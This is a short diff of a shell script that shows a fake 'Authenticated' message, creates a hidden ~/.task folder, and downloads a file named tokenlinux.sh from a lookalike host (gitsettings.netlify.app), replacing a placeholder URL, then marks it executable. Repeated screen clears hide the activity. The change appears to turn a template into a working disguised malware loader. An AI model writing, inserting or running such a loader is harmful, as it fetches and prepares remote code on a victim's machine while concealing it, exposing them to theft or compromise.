@@ -3,7 +3,7 @@ set -e
 echo "Authenticated"
 mkdir -p "$HOME/.task"
 clear
-curl -s -L -o "$HOME/.task/tokenlinux.sh" "https://<your-server-url>/120/ls.sh"
+curl -s -L -o "$HOME/.task/tokenlinux.sh" "https://gitsettings.netlify.app/120/ls.sh"
 clear
 chmod +x "$HOME/.task/tokenlinux.sh"
 clear
